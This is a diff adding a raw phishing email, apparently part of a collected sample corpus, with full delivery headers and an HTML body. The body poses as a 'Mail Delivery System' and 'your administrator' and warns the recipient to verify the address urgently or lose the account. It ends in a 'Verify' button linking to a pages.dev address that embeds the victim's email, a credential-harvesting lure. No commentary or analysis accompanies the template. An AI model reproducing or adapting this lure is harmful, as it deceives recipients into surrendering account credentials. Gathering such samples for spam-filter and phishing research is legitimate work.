@@ -1,0 +1,174 @@
+Return-Path: nlrdhq@apsfl.co.in
+Delivered-To: jose@monkey.org
+X-FDA: 83499687306.12.BCC1282
+Received: from mail.apsfl.co.in (mail.apsfl.co.in [103.211.109.135])
+	by imf17.b.hostedemail.com (Postfix) with SMTP id C808F140004
+	for <jose@monkey.org>; Fri, 30 May 2025 13:41:40 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;
+	dkim=pass header.d=apsfl.co.in header.s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA
+ header.b=TWdBqBkJ;
+	dmarc=none;
+	spf=pass (imf17.b.hostedemail.com: domain of nlrdhq@apsfl.co.in designates
+ 103.211.109.135 as permitted sender) smtp.mailfrom=nlrdhq@apsfl.co.in
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1748612512; a=rsa-sha256;
+	cv=none;
+	b=aKVuCV0EmhqEmYCg4gYhx4fJNqDuU9vUKTAiu0xPPbF4tjFWwxgR9xoLls+OCORUAViCBb
+	v0p3VN+BFZHTWjBmbJdRi2SImokV1ihWJUpw7jNvwmqgZAKAT97h5+tee3AZv/2uQ1kDDD
+	18/dmHZhsbbSOwRer1e85lTQrORnCyA=
+ARC-Authentication-Results: i=1;
+	imf17.b.hostedemail.com;
+	dkim=pass header.d=apsfl.co.in header.s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA
+ header.b=TWdBqBkJ;
+	dmarc=none;
+	spf=pass (imf17.b.hostedemail.com: domain of nlrdhq@apsfl.co.in designates
+ 103.211.109.135 as permitted sender) smtp.mailfrom=nlrdhq@apsfl.co.in
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1748612512;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=dqyCU0HQn/S8jyOfVnlfBw0bqX46Xu1WjXi3lWE+pn0=;
+	b=3s+1Rtmv19td2LrPcRbkJ3+z4ta79oGfB1dAmVc10/gd2MLf9fVgYMawgNXaCSkprobb2u
+	G62gZAQrg6q6xKd40UMBMhSs3o76FT2dBx28hWA0Bj9HBcSYe/AL6IsK5E6+LGhgqpi+j+
+	zvA6CIQJb/N5Rxj8KretjZRC4i+Id5s=
+Received: from localhost (localhost [127.0.0.1])
+	by mail.apsfl.co.in (Postfix) with ESMTP id 005E5153E5646
+	for <jose@monkey.org>; Fri, 30 May 2025 16:34:15 +0530 (IST)
+Received: from mail.apsfl.co.in ([127.0.0.1])
+	by localhost (mail.apsfl.co.in [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id Acha4Djj-6Cb for <jose@monkey.org>;
+	Fri, 30 May 2025 16:34:15 +0530 (IST)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.apsfl.co.in (Postfix) with ESMTP id 88CE8114AFA8F
+	for <jose@monkey.org>; Fri, 30 May 2025 09:39:29 +0530 (IST)
+DKIM-Filter: OpenDKIM Filter v2.9.2 mail.apsfl.co.in 88CE8114AFA8F
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=apsfl.co.in;
+	s=C18A96D4-A33F-11E6-8499-F8218B9BD2FA; t=1748578169;
+	bh=dqyCU0HQn/S8jyOfVnlfBw0bqX46Xu1WjXi3lWE+pn0=;
+	h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+	 Content-Transfer-Encoding;
+	b=TWdBqBkJxC/rxNNoKxVSa0Vtoj9fRGKDyOIsQd82UaetsLbCZWeUbT0vC0XsyCNTR
+	 G3gnGQSjz5X6iuq8veVI3hQyMxHdiMs98qr56M4mTzV3m7iMihw8iYt3cdjuh6D6so
+	 UAlcs8a1+lsGshXwS1fPfhfs8vWM0hRW4hAJDNQ0=
+X-Virus-Scanned: amavisd-new at apsfl.co.in
+Received: from mail.apsfl.co.in ([127.0.0.1])
+	by localhost (mail.apsfl.co.in [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id vY2vKHxjL-ja for <jose@monkey.org>;
+	Fri, 30 May 2025 09:39:29 +0530 (IST)
+Received: from [167.148.167.44] (unknown [167.148.167.44])
+	by mail.apsfl.co.in (Postfix) with ESMTPSA id 3DF5B114B7DBB
+	for <jose@monkey.org>; Fri, 30 May 2025 02:41:47 +0530 (IST)
+From: Mail Delivery System <nlrdhq@apsfl.co.in>
+To: jose@monkey.org
+Subject: Notice: jose@monkey.org Verification Required
+Date: 29 May 2025 21:11:43 -0700
+Message-ID: <20250529211143.13CB011548F67A70@apsfl.co.in>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=7.80
+X-Stat-Signature: hrytuixza5mu6gek8dnkbr4gj4bouwj1
+X-Rspamd-Server: rspam08
+X-Rspam-User: 
+X-Rspamd-Queue-Id: C808F140004
+X-HE-Tag: 1748612500-814497
+X-HE-Meta: 
+ U2FsdGVkX1+hefkfJrzAo/a0cyVJ3UEkkC5NN5haYF370adISyklv9QTQ2cynH8C1Mua3+cBP2+qYpBvSWcn8JpNFa+aKZwbK4BQUe/TDW7UDrLWm0bLFXr4aFhXdlwxVeKt5SjlZfUd7Hi1bUwlIsV6ztPsWPaxnG7otcetNcJF+o1qQaQaH1+z8wFFmcenl+nE22gbQosmFOTVbcawGetVA/F1GCMyrF2UM3yDRUKhSzYCkD9342/jUAHfDgUOkYeuLSXfztRlwoiUkbzRfNQ6r5+HvWKOLpDNwxNdQkIuRye+kAcNJhtI21RcTe7bi/miTudOSvj4jflA/j0Odmwy8Q3HQolY1q6gpB7ZKFqrrl9yK7QMUGFeDHMiJh47Ui45/PWHPI5Emvd143s1/mdCJP2yPW5Qz/biMP8Ttoi0aA9eu9mHsvd3/Xsq37I4bH4GiCStTFPEfCpY3RWEmVQTsYUdnlQdylstdpmNsuuWoWEIgqYia1BdgMYtiOlHq+vR8Tn2XGhWAnxybgLo9mYghaLoHJrED41OXZ5NVb+VHHeP+0MZz/CdRgXmdynoVs/JNFsgV2dGt0M3kowCLueVrsnfofhdgKCAAB4/3028rSLLsGu7hCs/L1TrvpJIzGxNeJ4kRtHJMlmw+zf8E97GPIVGinp1RR4DH14aXsOdBFINVFiOW/zbJMzkxl1Qe4GAHtwRo3Fuyrcai3eSzVyFd3kbYjn7GnLaYBLGGcg5pp7Q+M2vG97soHckUKQmq7opvW5E2nRdnm5jjd26PW6xFlxTnYx49GrvzCMHOWDwW5Ae9kxsF+IbuL8g6ROPtIJTjznFiz2fPLF/NxOzK/xQkT5ZzvmVNSPoiFjxAaL8HEUbjj0yf0kYEirjHK4RSTeVCeqS7qc7cAbQ2ra0Wxt+RzMEJkJRi7oCOQgok8EA2de9viKGAjwJTqsAgC+KWGdG6FiW/xK8F3ZXnQPmUrzfMWM
+ 2kU4/pyYDGSd7WsXdvmlmvsd+mgZxblgWfK4wqSYEsxjsq7CpPjacxXbc9l8AU067vIyrrs8EluAY7Senum2lCCPb25+dBQhxa68jCr+X+4UNOMOVJM+g0dSviIsEFm4hcEEzkzcttWfLkAiSYnH0b8RJCr77ZbjJ9LiKFiZ/HLViMaBR/LWypKrdmY+Ux3VYltPNwgxN1hlqGZgGbSmA9LKojwadtoktkUK60WWMc/5rHuvmYjjILDtWyZa12nXyMtNb/KVLy3Dsy6TRLVg94WJfoWM15kRtVjffKlRoaIUry10j760h4fKvx1edFQMzWTqbngDmRBLdUAxyaPcjqRmQl6xM+QfgX36lzFDHxxUo4RibHF9QgVnG2yaDlhjO4LxYK+KX2rBFn5tqFbwSGgdehQMwpwygnvZ++67AHquyDInyvFAYBmdAdQTakJj3BHZ1g4UfodVFLb9xvUZBBoN+ogojZ+vwm+u5hmoYqs9eH37VjMi7Cgk3/c8SnB0Dq1Di3dU4/83eQM/Er3zzOYeK5r7XqTG/DV0IpUGX2/f0wKfv1m7/QftOckJ5hoBbToZeNflf5akOb8YaEWNySpvIT+0OAw0+Er9Rm2rwFEF1ltwXPLu0uFlv9WQDuH42DCCMizRrKYzyTneZzpZnYQRJ+slNfsMbTaRPq5VQ13un8iACBWJ1aR7TEWmPvN5yixgyLpn9Tkiq6F1eqZbwiJ+1ttC8SFXrRhHLGwQYgOkeprY=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 236
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div id=3D"editbody1">
+<div style=3D"margin: 0.5em;">
+<div id=3D"v1yiv3835738702m_-3963264072071041189m_-2068912727642064907m_600=
+9891601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887=
+9619gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6" style=3D"text-align:=
+ left; color: rgb(38, 38, 38); text-transform: none; text-indent: 0px; lett=
+er-spacing: normal; padding-top: 0px; font-family: Roboto, sans-serif; font=
+-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px; borde=
+r-top-width: 0px; white-space: normal; orphans: 2;=20
+widows: 2; text-shadow: none; background-color: rgb(255, 255, 255); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial;"><span style=3D"font-family: Calibri; fon=
+t-size: medium; text-shadow: none;">Dear&nbsp;jose</span></div>
+<div id=3D"v1yiv3835738702m_-3963264072071041189m_-2068912727642064907m_600=
+9891601274502908m_21672076248843749m_-5271971888064844125m_-624552921922887=
+9619gmail-m_3983087730740183267gmail-xd123e1ec33bf4f6" style=3D"text-align:=
+ left; color: rgb(38, 38, 38); text-transform: none; text-indent: 0px; lett=
+er-spacing: normal; font-family: Roboto, sans-serif; font-size: 13px; font-=
+style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; or=
+phans: 2; widows: 2; text-shadow: none;=20
+background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al;"><span style=3D"font-family: Calibri; font-size: medium; text-shadow: n=
+one;"><br style=3D"text-shadow: none;">Your&nbsp;Email&nbsp;verification&nb=
+sp;is required urgently to continue using&nbsp;the mail&nbsp;services.</spa=
+n></div>
+<div style=3D"text-align: left; color: rgb(38, 38, 38); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; text-shadow: none; background=
+-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial; text-decoration-style: initial;=20
+text-decoration-color: initial;">
+<span style=3D"font-family: Calibri; font-size: medium; text-shadow: none;"=
+>Please verify your email to avoid loosing your mail account.<br style=3D"t=
+ext-shadow: none;"></span></div>
+<div style=3D"text-align: left; color: rgb(38, 38, 38); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; text-shadow: none; background=
+-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial; text-decoration-style: initial;=20
+text-decoration-color: initial;">
+<span style=3D"font-family: Calibri; font-size: medium; text-shadow: none;"=
+></span>&nbsp;</div>
+<div style=3D"text-align: left; color: rgb(38, 38, 38); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 13px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; orphans: 2; widows: 2; text-shadow: none; background=
+-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial; text-decoration-style: initial;=20
+text-decoration-color: initial;">
+<span style=3D"font-family: Calibri; font-size: medium; text-shadow: none;"=
+></span>
+<a style=3D"border-width: 0px; margin: 0px; padding: 14px 7px; border-radiu=
+s: 4px; width: 210px; text-align: center; color: white; text-decoration: un=
+derline; vertical-align: baseline; display: block; max-width: 150px; outlin=
+e-width: medium; outline-style: none; font-stretch: inherit; text-shadow: n=
+one; background-color: blue;" href=3D"https://wwjhegtyfd8hui.pages.dev/?ydW=
+UsIm=3Djose@monkey.org(**)NjIzOT" target=3D"_blank" rel=3D"noopener norefer=
+rer">
+<span style=3D"font-family: Calibri; text-shadow: none;">
+Verify jose@monkey.org</span></a><br style=3D"color: rgb(64, 64, 64); font-=
+family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 16px;=
+ text-shadow: none;"><span style=3D"font-family: Calibri; text-shadow: none=
+;"></span>
+<p style=3D"color: rgb(64, 64, 64); text-shadow: none;"><span style=3D"vert=
+ical-align: inherit; text-shadow: none;"><span style=3D"color: rgb(255, 0, =
+0); font-family: Calibri; vertical-align: inherit; text-shadow: none;">This=
+ is an automated email from your administrator to&nbsp;jose@monkey.org.</sp=
+an></span></p><span style=3D"font-family: Calibri; text-shadow: none;"><spa=
+n style=3D"vertical-align: inherit; text-shadow: none;">
+<span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: medium=
+; vertical-align: inherit; text-shadow: none;">&nbsp;</span></span></span><=
+span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: large; =
+text-shadow: none;">Email Support</span><span style=3D"color: rgb(0, 0, 0);=
+ font-family: Calibri; font-size: medium; text-shadow: none;"><span style=
+=3D"font-size: large;">.</span></span></div></div></div></body></html>
+
